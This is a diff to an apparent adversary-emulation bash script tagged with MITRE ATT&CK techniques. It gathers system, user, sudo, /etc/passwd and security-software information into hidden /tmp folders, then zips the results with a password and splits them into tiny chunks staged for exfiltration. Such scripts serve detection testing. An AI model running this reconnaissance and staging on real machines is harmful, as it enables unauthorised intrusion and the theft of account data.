@@ -13,58 +13,37 @@ if [ ! -d "/tmp/.exfil/" ]; then mkdir -p /tmp/.exfil/; fi;
 ############################################
 function discovery() {
   SYSINF="/tmp/.staging/system.txt"
-  MACCHECK="$(sw_vers -productName | cut -d ' ' -f1)"
-
-  if [[ "$MACCHECK" == "Mac" ]]; then
-    PLAT="Mac"
-  else
-    PLAT="Linux"
-  fi
-
-  echo "Target Platform - " $PLAT
+  echo -e "Target Platform: $PLAT \n"
   echo "Target Platform: " $PLAT >> $SYSINF
   echo "Target Kernel:" >> $SYSINF && uname -a >> $SYSINF
   echo "Uptime:" >> $SYSINF && uptime >> $SYSINF
   echo "hostname:" >> $SYSINF && hostname >> $SYSINF
-  echo "Getting General Release Information"
+  echo -e "Getting General Release Information \n"
+  echo -e "Getting Linux Release Information \n"
+  echo "Release:" >> $SYSINF
+  lsb_release >> $SYSINF 2> /dev/null
 
-  if [ "$PLAT" = "Mac" ]; then
-    echo "Getting macOS Release Information"
-    echo "System Profiler:" >> $SYSINF
-    system_profiler >> $SYSINF 2> /dev/null
-  else
-    echo "Getting Linux Release Information"
-    echo "Release:" >> $SYSINF
-    lsb_release >> $SYSINF 2> /dev/null
-  fi
 
   ### Technique: Account Discovery https://attack.mitre.org/wiki/Technique/T1087
   ### Collect User Account Information
   USERINF=/tmp/.staging/users.txt
-  echo "Getting User Information"
-
+  echo -e "Getting User Information \n"
   echo "Whoami:" >> $USERINF && whoami >> $USERINF
   echo "Current User Activity:" >> $USERINF && w >> $USERINF 2> /dev/null
   echo "Sudo Privs" >> $USERINF && sudo -l -n >> $USERINF 2> /dev/null
   echo "Sudoers" >> $USERINF && cat /etc/sudoers >> $USERINF 2> /dev/null
   echo "Last:" >> $USERINF && last >> $USERINF 2> /dev/null
 
-  if [ "$PLAT" == "Mac" ]; then
-    echo "Getting Mac Group Information"
-    echo "Group Information:" >> $USERINF
-    dscl . list /Groups >> $USERINF
-    dscacheutil -q group >> $USERINF
-  else
-    echo "Getting Linux Group Information"
-    echo "Group Information:" >> $USERINF
-    cat /etc/passwd >> $USERINF
-    echo "Elevated Users" >> $USERINF && grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' >> $USERINF
-  fi
+  echo -e "Getting Linux Group Information \n"
+  echo "Group Information:" >> $USERINF
+  cat /etc/passwd >> $USERINF
+  echo "Elevated Users" >> $USERINF && grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 { print $1}' >> $USERINF
+
 
   ### Technique: Software Discovery: Security Software Discovery https://attack.mitre.org/techniques/T1518/001/
   ### Check for common security Software
   SECINF=/tmp/.staging/security.txt
-  echo "Getting Security Software Information"
+  echo -e "Getting Security Software Information \n"
   echo "Running Security Processes" >> $SECINF && ps ax | grep -v grep | grep -e Carbon -e Snitch -e OpenDNS -e RTProtectionDaemon -e CSDaemon -e cma >> $SECINF
 }
 
@@ -74,10 +53,10 @@ function discovery() {
 # Technique:  Archive Collected Data: Archive via Library https://attack.mitre.org/techniques/T1560/002/
 ############################################
 function exfil() {
-echo "Compress and encrypt all collected data for exfil"
+echo -e "Compress and encrypt all collected data for exfil \n"
 zip --password "Hope You Have Eyes on This!!" /tmp/.staging/loot.zip /tmp/.staging/* > /dev/null 2>&1
 
-echo "Prepare Exfil data - Split file into small chucks (23byte) before Exfil"
+echo -e "Prepare Exfil data - Split file into small chucks (23byte) before Exfil \n"
 split -a 15 -b 23 "/tmp/.staging/loot.zip" "/tmp/.exfil/loot.zip.part-"
 }
 
